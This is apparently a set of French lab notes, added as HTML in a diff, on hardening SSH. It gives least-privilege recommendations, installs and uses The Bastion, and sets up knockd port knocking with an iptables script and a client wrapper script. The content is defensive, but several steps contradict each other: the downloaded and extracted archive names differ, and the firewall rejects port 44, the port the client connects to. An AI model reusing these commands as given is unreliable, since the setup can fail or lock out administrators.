+<p>Les droits d’un utilisateur doivent suivre le principe de moindre privilège. La restriction peut porter sur de nombreux paramètres : commandes accessibles, adresses IPs d’origine, droit de redirections ou de forwarding</p>
+</li>
+<li>
+<p>L’usage du mécanisme d’agent forwarding (option -A de ssh) est recommandé dans les cas où un rebond SSH est nécessaire au travers d’un serveur hôte relais.</p>
+</li>
+<li>
+<p>Le serveur hôte relais doit être un hôte de confiance.</p>
+</li>
+<li>
+<p>Chaque utilisateur doit disposer de son propre compte, unique, incessible.</p>
+</li>
+<li>
+<p>Les accès à un service doivent être restreints aux utilisateurs qui en ont un besoin justifié.<br />
+Cette restriction doit s’appliquer en droits positifs : uniquement ceux explicitement autorisés ont le droit de se connecter en SSH sur un hôte, et éventuellement en provenance d’adresses IP spécifiées.</p>
+</li>
+<li>
+<p>L’altération de l’environnement par un utilisateur doit être bloquée par défaut. Les variables autorisées à la modification par le client doivent être sélectionnées au cas par cas.</p>
+</li>
+<li>
+<p>Les commandes lancées par un utilisateur au travers d’une session SSH doivent être réduites au strict nécessaire ; cette restriction peut être mise en place par l’utilisation :</p>
+<ul>
+<li>de la directive ForceCommand pour un utilisateur donné, dans le fichier sshd_config ;</li>
+<li>en spécifiant des options dans le fichier authorized_keys ;</li>
+<li>de binaires dûment protégés comme sudo ou su.</li>
+</ul>
+</li>
+<li>
+<p>Le serveur SSH doit écouter uniquement sur une adresse d’administration</p>
+</li>
+<li>
+<p>Lorsque le serveur SSH est exposé à un réseau non maîtrisé, il est recommandé de lui mettre un port d’écoute différent du port par défaut (22).</p>
+</li>
+<li>
+<p>Il faut privilégier un port inférieur à 1024 afin d’empêcher les tentatives d’usurpation par des services non administrateur sur la machine distante.</p>
+</li>
+<li>
+<p>Sur un réseau maîtrisé, le serveur SSH doit écouter uniquement sur une interface du réseau d’administration, distinct du réseau opérationnel.</p>
+</li>
+<li>
+<p>Sauf besoin dûment justifié, toute fonctionnalité de redirections de flux doit être désactivée :</p>
+<ul>
+<li>au niveau de la configuration du serveur SSH ;</li>
+<li>au niveau du pare-feu local en bloquant les connexions.</li>
+</ul>
+</li>
+<li>
+<p>La redirection X11 doit être désactivée sur le serveur.</p>
+</li>
+<li>
+<p>Il est recommandé de créer des ACs distinctes lorsque leurs rôles diffèrent. On aura par exemple :</p>
+<ul>
+<li>une qui jouera le rôle d’AC « hôte » ;</li>
+<li>une qui jouera le rôle d’AC «utilisateurs».</li>
+</ul>
+</li>
+<li>
+<p>Chaque clé privée d’une AC doit être protégée par un mot de passe unique, robuste.</p>
+</li>
+<li>
+<p>Dans le cas où une clé ne peut plus être considérée comme sûre, l’usage de celle-ci doit être rapidement révoqué au niveau de SSH.</p>
+</li>
+<li>
+<p>La validation des empreintes SSH hôte envoyées par le serveur DNS ne doit pas se faire sans une vérification complémentaire.</p>
+</li>
+</ol>
+<h2 id="the-bastion">The Bastion</h2>
+<ul>
+<li>Références:<ul>
+<li>https://ovh.github.io/the-bastion/</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h3 id="telechargement">Téléchargement</h3>
+<p><code>wget https://github.com/ovh/the-bastion/archive/refs/tags/v3.16.01.tar.gz</code><br />
+<code>mkdir -p /opt/bastion</code><br />
+<code>tar -C /opt/bastion -zxf v3.16.99-rc1.tar.gz</code>  </p>
+<h3 id="installation">Installation</h3>
+<p><code>/opt/bastion/bin/admin/packages-check.sh -i</code></p>
+<h3 id="setup">Setup</h3>
+<p><code>/opt/bastion/bin/admin/install --new-install</code></p>
+<h3 id="check">Check</h3>
+<p><code>/opt/bastion/bin/dev/perl-check.sh</code></p>
+<h3 id="creation-du-premier-compte">Création du premier compte</h3>
+<p><code>/opt/bastion/bin/admin/setup-first-admin-account.sh USERNAME auto</code></p>
+<h3 id="configuration-client-pour-se-connecter-au-bastion">Configuration Client (pour se connecter au bastion)</h3>
+<p><em>Création d'un alias pour éviter de se taper la commande entière h24</em><br />
+<code>alias bssh='ssh -t myname@the-bastion.example.org --'</code></p>
+<h3 id="configuration-serveur">Configuration Serveur</h3>
+<p><em>Récupérer la clé EgressKey dans le terminal du bastion</em>  </p>
+<pre><code> bssh(master)&gt; `selfListEgressKeys`  
+ ---the-bastion.example.org----------------------------the-bastion-2.99.99-rc9---  
+ =&gt; the public part of your personal bastion key  
+ --------------------------------------------------------------------------------  
+ ~ You can copy one of those keys to a remote machine to get access to it through your account  
+ ~ on this bastion, if it is listed in your private access list (check selfListAccesses)  
+ ~  
+ ~ Always include the from="198.51.100.1/32" part when copying the key to a server!  
+ ~  
+ ~ fingerprint: SHA256:rMpoCaYPSfRqmOBFOJvEr5uLqxYjqYtRDgUoqUwH2nA (ED25519-256) [2019/07/11]  
+ ~ keyline follows, please copy the *whole* line:  
+ from="198.51.100.1/32" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILnY2NQTKsTDxgcaTE6vHVm9FIbud1rJcYQ/4xUyr+DK johndoe@bssh:1562861572  
+ --------------------------------------------------------&lt;/selfListEgressKeys&gt;---
+</code></pre>
+<p><em>Rajouter la clé dans 'authorized_keys' chez le serveur de destination</em><br />
+<code>echo "from="198.51.100.1/32" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILnY2NQTKsTDxgcaTE6vHVm9FIbud1rJcYQ/4xUyr+DK johndoe@bssh:1562861572" &gt;&gt; /root/.ssh/authorized_keys</code></p>
+<p><em>Ajouter l'accès dans le terminal du bastion</em>  </p>
+<pre><code> bssh(master)&gt; selfAddPersonalAccess --host 198.51.100.42 --port 22 --user root  
+ ---the-bastion.example.org----------------------------the-bastion-2.99.99-rc9---  
+ =&gt; adding private access to a server on your account  
+ --------------------------------------------------------------------------------  
+ ~ Testing connection to root@198.51.100.42, please wait...  
+ Warning: Permanently added '198.51.100.42' (ECDSA) to the list of known hosts.  
+ ~ Access to root@198.51.100.42:22 successfully added  
+ -----------------------------------------------------&lt;/selfAddPersonalAccess&gt;---
+</code></pre>
+<p><em>Vérifier l'accès</em> </p>
+<pre><code> bssh(master)&gt; `selfListAccesses`  
+ ---the-bastion.example.org----------------------------the-bastion-2.99.99-rc9---  
+ =&gt; your access list  
+ --------------------------------------------------------------------------------  
+ ~ Dear johndoe, you have access to the following servers:  
+ | IP            | PORT| USER| ACCESS-BY| ADDED-BY| ADDED-AT  |  
+ | ------------- | --- | --- | -------- | ------- | --------- |  
+ | 198.51.100.42 | 22  | root| personal | johndoe | 2020-05-01|  
+ -----------------------------------------------------\&lt;/selfListAccesses&gt;---
+</code></pre>
+<h3 id="knockd">Knockd</h3>
+<ul>
+<li>Références:<ul>
+<li>https://goteleport.com/blog/ssh-port-knocking/</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h3 id="installation_1">Installation</h3>
+<p><code>apt install knockd</code></p>
+<h3 id="configuration">Configuration</h3>
+<p><em>/etc/knockd.conf</em></p>
+<pre><code> [options]  
+      UseSyslog
+
+ [openSSH]  
+      sequence    = 7000,8000,9000  
+      seq_timeout = 5  
+      command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT  
+      tcpflags    = syn
+
+ [closeSSH]  
+      sequence    = 9000,8000,7000  
+      seq_timeout = 5  
+      command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT  
+      tcpflags    = syn
+</code></pre>
+<p><em>/etc/default/knockd</em>  </p>
+<pre><code> # control if we start knockd at init or not  
+ # 1 = start  
+ # anything else = don't start  
+ # PLEASE EDIT /etc/knockd.conf BEFORE ENABLING  
+ START_KNOCKD=1
+
+ # command line options  
+ KNOCKD_OPTS="-i ens33"
+</code></pre>
+<p><code>systemctl start knockd</code><br />
+<code>systemctl enable knockd</code></p>
+<h3 id="configuration-iptables">Configuration iptables</h3>
+<p><em>Via un script pour se simplifier la vie</em>
+     # !/bin/bash  </p>
+<pre><code> # Delete current rules  
+ iptables -F ; iptables -X
+
+ # Don't f*ck up estabished connection  
+ iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT  
+ iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+
+ # Authorize localhost port 22 input  
+ iptables -t filter -i ens33 --src 127.0.0.1/32 -A INPUT -p TCP --dport 22 -j ACCEPT
+
+ # Authorize port 22 output  
+ iptables -t filter -A OUTPUT -p TCP --sport 22 -j ACCEPT
+
+ # Authorize all port 80 traffic  
+ iptables -t filter -A INPUT -p TCP --sport 80 -j ACCEPT  
+ iptables -t filter -A OUTPUT -p TCP --sport 80 -j ACCEPT
+
+ # Authorize all port 53 traffic  
+ iptables -t filter -A INPUT -p TCP --sport 53 -j ACCEPT  
+ iptables -t filter -A OUTPUT -p TCP --sport 53 -j ACCEPT
+
+ # Authorize all port 443 traffic  
+ iptables -t filter -A INPUT -p TCP --sport 443 -j ACCEPT  
+ iptables -t filter -A OUTPUT -p TCP --sport 443 -j ACCEPT
+
+ # Authorize ICMP traffic  
+ iptables -t filter -A INPUT -p ICMP -j ACCEPT  
+ iptables -t filter -A OUTPUT -p ICMP -j ACCEPT
+
+ # Drop all port 44 connection  
+ iptables -A INPUT -p tcp --dport 44 -j REJECT
+
+ # Drop all  
+ iptables -t filter -A INPUT -j DROP  
+ iptables -t filter -A OUTPUT -j DROP
+
+ # List new rules  
+ iptables -L
+</code></pre>
+<h3 id="script-client-knockd">Script Client Knockd</h3>
+<p><em>Script pour permettre d'envoyer la séquence d'ouverture knockd, lancer la session ssh puis d'envoyer le séquence de fermeture knockd (cela éviter d'oublier de fermer le port après la session ssh)</em></p>
+<pre><code> #!/bin/bash
+
+ # Target IP address  
+ TARGET_IP="192.168.157.129"
+
+ # User  
+ USER="natha"
+
+ # Port  
+ PORT="44"
+
+ # Private key  
+ PRIV_KEY="/home/user/tp_hard/tp_hard"
+
+ # Port knocking sequence to open SSH  
+ OPEN_SEQ=(7000 8000 9000)
+
+ # Port knocking sequence to close SSH (reverse order)  
+ CLOSE_SEQ=(9000 8000 7000)
+
+ # Knocking sequence sending function  
+ knock_sequence() {  
+      local ip=\$1  
+      shift  
+      local ports=("$@")
+
+      for port in "\${ports[@]}"; do  
+           knock -v \$ip $port  
+           sleep 1  
+           done 
+      }
+
+ # Open SSH  
+ echo "Sending sequence to open SSH..."  
+ knock_sequence \$TARGET_IP "${OPEN_SEQ[@]}"
+
+ # Open SSH connection  
+ echo "SSH connection to $TARGET_IP"  
+ ssh $USER@$TARGET_IP -p $PORT -i $PRIV_KEY
+
+ # Schedule closing sequence   
+ echo "Sending sequence to close SSH..."  
+ #at now + 1 minute  
+ knock_sequence \$TARGET_IP ${CLOSE_SEQ[@]}
+
+ echo "Closing sequence sceduled."
+</code></pre>
 
 
 
